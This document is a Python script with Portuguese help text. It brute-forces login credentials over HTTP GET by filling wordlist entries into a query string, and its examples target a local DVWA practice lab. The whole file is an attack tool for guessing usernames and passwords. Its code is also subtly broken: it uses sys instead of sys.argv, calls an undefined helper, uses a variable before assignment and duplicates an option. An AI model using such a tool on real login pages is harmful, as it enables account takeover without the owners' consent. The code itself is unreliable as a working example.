from bs4 import BeautifulSoup
import requests
import re
import sys
import getopt

def uso_http_get():
    print("")
    print("Comandos:")
    print("")
    print('-h, --help             : help')
    print("-u, --url              : url do alvo")
    print("-w, --wordlist         : caminho da wordlist")
    print("-b, --body             : informações da requisição")
    print("-t, --cookies          : cookies")
    print("-t, --type             : tipo do brute force")
    print("-v, --validator        : tipo do brute force")
    print("")   
    print(f"EX: python {__file__} -t get -u 'http://127.0.0.1/dvwa/login.php/brute.php' -w path_wordlist -c 'cookies' -b '?username=$&password=$&Login=Login#' -v 'Username and/or password incorrect.' ")
    print("")

def send_get(url,credential,validator,cookies=None):
    try:
        if cookies is not None:response = requests.get(url,allow_redirects=True,cookies=formatar_dicionario(cookies,";"))
        else: response = requests.get(url,allow_redirects=True)
        if validator not in response.text:
            print(response.status_code,credential)
    except Exception as e:
        print(e)

def http_get_handler(url,body,wordlist,validator,cookies):
    try: 
        cred1 = ''
        cred2 = ''
        cont = body.count("$")
        if cont >= 1:
            with open(wordlist,'r') as file:
                linhas = file.readlines()
                for linha in linhas:
                    cred1 = linha
                    body_to_send_1 = body.replace("$",linha.strip(),1)
                    if cont > 1:
                        with open(wordlist,'r') as file2:
                            linhas2 = file2.readlines()
                            for linha2 in linhas2:
                                cred2 = linha2
                                body_to_send_2 = body_to_send_1.replace("$",linha2.strip(),1)
                                string = url + body_to_send_2
                                send_get(string,[cred1,cred2],validator,cookies)
                    else: send_get(string,[cred1],validator,cookies)
                            # send_get(string,[cred1,cred2],cookies)

        elif body.count("$") == 2:
            pass
        else:
            raise ValueError("O caractere '$' não foi encontrado no texto.")
    except Exception as e:
        print(e)

try:
    opts,args = getopt.getopt(sys[1:],'u:w:b:c:v:', ['--url=','--wordlist=','--body=','--cookies=','--validator='])
    url = None
    body = None
    wordlist = None
    cookies = False
    validator = None
    
    for a,i in opts:
        if a in('-u','--url'):
            url = i
        elif a in ('-w','--wordlist'):
            wordlist = i
        elif a in ('-b','--body'):
            body = i
        elif a in ('-c','--cookies'):
            cookies = i
        elif a in ('-v','--validator'):
            validator = i
        else:
            raise getopt.GetoptError("Argumentos inválidos")
    for i in [url,body,wordlist,validator,cookies]:
        if i is None:
            raise getopt.GetoptError("Argumentos inválidos")
    http_get_handler(url,body,wordlist,validator,cookies)
except Exception as e:
    print(e)
    uso_http_get()

# url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
# get_body = "?username=$&password=$&Login=Login#"
# cookies = "security=low; PHPSESSID=jkp318n6lq4gp89v92f46dshad"
# wordlist = "teste.txt"
# validator = "Username and/or password incorrect."   
# http_get_handler(url,get_body,wordlist,validator,cookies)
